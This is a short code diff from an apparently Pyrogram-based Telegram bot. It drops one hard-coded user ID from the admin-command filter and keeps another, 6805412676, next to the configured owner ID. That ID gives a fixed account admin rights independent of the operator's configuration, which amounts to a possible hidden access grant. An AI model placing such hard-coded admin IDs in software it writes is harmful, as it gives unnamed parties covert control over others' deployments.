@@ -160,7 +160,7 @@ def register(app: Client):
 
     def is_admin_filter(_, __, message: Message) -> bool:
         user_id = message.from_user.id if message.from_user else 0
-        return user_id in (Config.OWNER_ID, 6805412676, 7478754863) or is_sudo_user(user_id)
+        return user_id in (Config.OWNER_ID, 6805412676) or is_sudo_user(user_id)
 
     # ─── /admin command ────────────────────────────────────────────────────────
     @app.on_message(filters.command("admin") & filters.private & filters.create(is_admin_filter))
